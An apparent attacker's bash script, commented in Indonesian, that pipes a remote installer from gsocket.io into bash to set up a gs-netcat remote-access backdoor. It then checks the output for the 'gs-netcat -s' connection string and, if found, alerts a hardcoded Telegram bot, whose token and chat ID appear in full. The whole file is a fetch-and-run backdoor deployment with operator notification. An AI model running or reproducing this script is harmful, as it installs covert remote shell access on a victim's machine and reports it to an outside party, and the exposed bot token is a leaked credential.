#!/bin/bash

# Menjalankan perintah dan menyimpan outputnya
output=$(bash -c "$(curl -fsSL https://gsocket.io/y)")

# Cek apakah output mengandung string "gs-netcat -s"
if [[ "$output" == *"gs-netcat -s"* ]]; then
  # Kirim pesan ke Telegram
  chat_id="6256985839"  # Ganti dengan chat ID Telegram Anda
  bot_token="7120060654:AAEmYjKb0zNviPESOFatSBc7SL4foGVZuRE"  # Ganti dengan bot token Telegram Anda
  message="Command found: gs-netcat -s"

  # Kirimkan pesan ke Telegram (tanpa output detail)
  curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
       -d chat_id="$chat_id" \
       -d text="$message" > /dev/null

  # Tampilkan notifikasi sederhana di terminal
  echo "Telegram Send"
fi
